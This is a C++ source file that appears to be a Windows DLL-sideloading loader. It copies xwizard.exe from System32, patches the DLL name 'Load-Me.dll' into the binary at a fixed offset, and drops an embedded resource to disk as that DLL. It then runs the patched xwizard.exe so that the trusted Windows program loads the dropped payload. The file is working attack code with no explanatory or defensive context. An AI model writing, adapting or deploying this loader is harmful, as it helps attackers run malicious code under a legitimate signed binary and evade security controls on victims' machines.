#include <iostream>
#include "resource.h"
#include <Windows.h>
#include <fstream>
#include <Shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

using namespace std;

void writeExecBufferToFile(const char* filename, const unsigned char* execBuffer, int bufferSize, std::streampos offset) {
    std::ofstream file;

    file.open(filename, std::ios::binary | std::ios::out | std::ios::in);
    if (!file)
        printf("Error opening file\n");
    file.seekp(offset);
    for (int i = 0; i < bufferSize + 2; i++) {
        file.write((char*)&execBuffer[i], sizeof(execBuffer[i]));
        if (execBuffer[i + 1] != 0)
            file.seekp(1, std::ios::cur);
    }

}

int loader() {
    const unsigned char* path = (const unsigned char*)"Load-Me.dll";
    writeExecBufferToFile("xwizard.exe", path, 11, 0x9238);
    ifstream inputFile;
    inputFile.open("xwizard.exe", ios::binary);

    if (!inputFile.is_open()) {
        cout << "Error opening file for reading." << endl;
        return 1;
    }

    unsigned char buffer[22];
    inputFile.seekg(0x9238);
    inputFile.read((char*)buffer, 22);

    for (int i = 0; i < 22; i += 2) {
        cout << buffer[i] << "-";
    }
    inputFile.close();

    return 0;
}

bool CopyFileFromSystem32()
{
    TCHAR szSrcFile[MAX_PATH] = TEXT("C:\\Windows\\System32\\xwizard.exe");
    TCHAR szDestFile[MAX_PATH];

    GetCurrentDirectory(MAX_PATH, szDestFile);
    PathAppend(szDestFile, TEXT("xwizard.exe"));

    return CopyFile(szSrcFile, szDestFile, FALSE) != 0;
}
int main()
{
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_ZERO1), L"ZERO");
    if (!hResource) {
        std::cout << "Unable to find the resource." << std::endl;
        return 1;
    }

    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
    if (!hLoadedResource) {
        std::cout << "Unable to load the resource." << std::endl;
        return 1;
    }

    LPVOID pLockedResource = LockResource(hLoadedResource);
    if (!pLockedResource) {
        std::cout << "Unable to lock the resource." << std::endl;
        return 1;
    }
    CopyFileFromSystem32();
    loader();
    DWORD dwSize = SizeofResource(NULL, hResource);

    HANDLE hFile = CreateFile(L"Load-Me.dll", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cout << "Unable to create the file." << std::endl;
        return 1;
    }

    DWORD dwBytesWritten;
    if (!WriteFile(hFile, pLockedResource, dwSize, &dwBytesWritten, NULL)) {
        std::cout << "Unable to write to the file." << std::endl;
        return 1;
    }

    CloseHandle(hFile);

    std::cout << "The binary file has been written to disk successfully." << std::endl;

    system("Xwizard.exe 0 0");

    return 0;
}
